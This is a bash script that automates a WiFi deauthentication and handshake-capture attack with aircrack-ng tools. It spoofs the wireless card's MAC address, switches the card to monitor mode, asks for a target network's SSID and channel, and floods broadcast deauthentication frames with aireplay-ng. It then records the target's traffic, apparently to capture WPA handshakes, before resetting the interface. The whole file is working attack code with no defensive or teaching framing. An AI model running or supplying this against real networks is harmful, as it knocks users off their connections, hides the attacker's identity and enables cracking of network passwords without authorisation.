#!/bin/bash

# Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

# Interface
interface=$(iw dev | awk '$1=="Interface"{print $2}')

trap ctrl_c INT
function ctrl_c () {
  kill -9 $airodump_ng_xterm_PID 1>&2 2>/dev/null
  kill -9 $aireplay_ng_xterm_PID 1>&2 2>/dev/null
  rm *.csv *.netxml 1>&2 2>/dev/null
  resetInterface
	exit 0
}

function startAttack () {
  # Show networks
  xterm -fg white -bg black -hold -geometry 120x60 -e "airodump-ng $interface" 1>&2 2>/dev/null &
  #airodump-ng $interface
  airodump_ng_xterm_PID=$!
  echo
  # Target
  echo -e "${purpleColour}"
  read -p "SSID: " ssid
  read -p "Chanel: " chanel
  echo -e "${endColour}"

  xterm -fg white -bg black -hold -e "aireplay-ng -0 10 -c FF:FF:FF:FF:FF:FF -e '$ssid' $interface && \
    echo -e '\n[${greenColour}*${endColour}] Done!'" &
  aireplay_ng_xterm_PID=$!

  mkdir -p "captures/$ssid"
  airodump-ng -w "captures/$ssid/$ssid-ch$chanel" --essid "$ssid" -c $chanel $interface
	
}

function setMonitorMode () {
  # Mac Address
  ifconfig $interface down && macchanger -a $interface >/dev/null
  ifconfig $interface up

  iw dev | grep monitor >/dev/null
  if [[ $(echo $?) -ne 0 ]]; then
    echo -e "[${blueColour}*${endColour}] Setting up environment..."
    # Monitor Mode
    airmon-ng check kill >/dev/null
    airmon-ng start $interface >/dev/null
  fi

  # Show new configurations
  iw dev
  macchanger -s $interface
  sleep 2
}

function resetInterface () {
  echo -e "[${blueColour}*${endColour}] Managed Interface"
  ip link set $interface down && iw $interface set type managed
  echo -e "[${blueColour}*${endColour}] Restarting Network Services"
  systemctl restart wpa_supplicant.service NetworkManager.service dhcpcd.service
  echo -e "[${blueColour}*${endColour}] Set default MAC\n"
  macchanger -p $interface 
  ip link set $interface up
  echo -e "\n[${greenColour}*${endColour}] Done!"
}

function checkDependencies () {
  clear
  dependencies=(aircrack-ng macchanger xterm)

  echo -e "[${greenColour}*${endColour}]${grayColour} Checking dependencies...${endColour}"

  for program in "${dependencies[@]}"; do
    echo -ne "\n[${yellowColour}*${endColour}]${blueColour} Tools ${endColour}\
      ${purpleColour} $program${endColour}${blueColour}...${endColour}"

    if [ -x "$(command -v $program)" ]; then
      echo -e " ${greenColour}(V)${endColour}"
    else
      echo -e " ${redColour}(X)${endColour}\n"
      echo -e "[${redColour}*${endColour}] Please install $program"
      exit 0
    fi
    sleep 1
  done
  clear
}

if [ "$(id -u)" == "0" ]; then
  clear
  checkDependencies
  setMonitorMode
  startAttack
  resetInterface

else
  echo -e "[${yellowColour}*${endColour}] Run as root"
fi
